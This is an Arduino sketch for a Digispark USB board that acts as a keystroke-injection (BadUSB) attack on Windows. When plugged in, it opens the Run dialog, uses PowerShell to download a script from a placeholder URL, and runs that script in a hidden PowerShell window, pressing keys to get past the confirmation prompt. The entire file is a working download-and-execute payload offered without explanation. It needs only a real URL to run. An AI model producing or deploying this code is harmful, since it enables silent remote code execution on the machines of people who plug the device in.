#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("powershell");
  delay(2000);
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  delay(2000);
  DigiKeyboard.println("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
  delay(10000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
  delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  while(1);
 }


